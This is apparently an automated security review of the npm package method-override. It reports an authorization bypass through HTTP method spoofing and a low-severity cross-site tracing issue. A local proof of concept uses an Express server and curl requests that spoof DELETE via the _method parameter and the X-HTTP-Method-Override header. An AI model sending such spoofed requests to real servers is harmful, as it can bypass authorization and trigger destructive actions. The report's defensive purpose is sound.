# method-override — Security Review Findings

**Package:** [method-override](https://www.npmjs.com/package/method-override) | **Files reviewed:** 1

## Summary

| ID | Vulnerability Class | Severity | Breachable | Location |
|----|---------------------|----------|------------|----------|
| MO-01 | HTTP Method Spoofing Authorization Bypass | MEDIUM | Yes | `methodOverride` inner middleware, lines 68-79 |
| MO-02 | Cross-Site Tracing (XST) via Method Whitelist | LOW | No | `supports()`, line 143 |

---

## MO-01: HTTP Method Spoofing Authorization Bypass

- **Vulnerability class:** HTTP Method Spoofing / Authorization Bypass
- **Raw severity:** MEDIUM
- **Adjusted severity (after reachability):** MEDIUM
- **Location:** `methodOverride` inner middleware, lines 68-79

### Reachability Analysis

Any unauthenticated HTTP client can send a POST request with `_method` query parameter or `X-HTTP-Method-Override` header to override the HTTP method to an arbitrary verb (e.g., DELETE, PUT). This allows bypassing authorization middleware that checks `req.method` after method-override runs.

### Gate Status

**No gate** — exploitable in default configuration with no additional conditions required.

**Breach:** True

---

## MO-02: Cross-Site Tracing (XST) via Method Whitelist

- **Vulnerability class:** Cross-Site Tracing (XST)
- **Raw severity:** LOW
- **Adjusted severity (after reachability):** LOW
- **Location:** `supports()`, line 143

### Reachability Analysis

A POST request with `_method=TRACE` can be used to override the method to TRACE on a server that reflects request headers in the response body. Requires the target server to actually handle TRACE and reflect headers — a narrow but real attack surface.

### Gate Status

Not reachability-tested (LOW severity).

---

## Clean / Rejected

| Finding | Reason for Rejection |
|---------|---------------------|
| CSRF protection bypass via null methods config | Requires developer misconfiguration (`opts.methods = null`). Not exploitable in default or reasonable configurations. |

---

---

## Reproduction (validated 2026-06-19)

**Lab reference:** `targets/labs/npm-method-override/`

**Pinned version:** method-override 3.0.0

### Steps

1. **Install dependencies:**
   ```bash
   npm install method-override@3.0.0 express
   ```

2. **Start a test server** with method-override middleware and a DELETE-only route:
   ```javascript
   const express = require('express');
   const methodOverride = require('method-override');
   const app = express();
   app.use(methodOverride('_method'));
   app.delete('/resource', (req, res) => res.json({ result: 'DELETE went through' }));
   app.listen(5555);
   ```

3. **Send a POST with `_method=DELETE`** to spoof the HTTP method:
   ```bash
   curl -s -X POST "http://127.0.0.1:5555/resource?_method=DELETE"
   ```

4. **Repeat with the header variant:**
   ```bash
   curl -s -X POST "http://127.0.0.1:5555/resource" -H "X-HTTP-Method-Override: DELETE"
   ```

5. **Verify** the DELETE handler executed despite the request being a POST.

### Observed output (from `targets/labs/npm-method-override/results.txt`)

```
method-override PoC -- version: 3.0.0
  plain POST  -> { result: 'POST went through' }
  POST+_method=DELETE -> { result: 'DELETE went through',
    note: 'an authorization check that only inspects req.method would have been bypassed' }
  POST+X-HTTP-Method-Override:DELETE -> { result: 'DELETE went through',... }

  >>> MO-01 CONFIRMED: DELETE was reached via POST spoofing <<<
```

### Verdict

**CONFIRMED.** Both `_method` query parameter and `X-HTTP-Method-Override` header override POST to DELETE in default configuration.

---

**Pipeline:** 3 raw findings → 2 confirmed (1 MEDIUM breachable, 1 LOW)
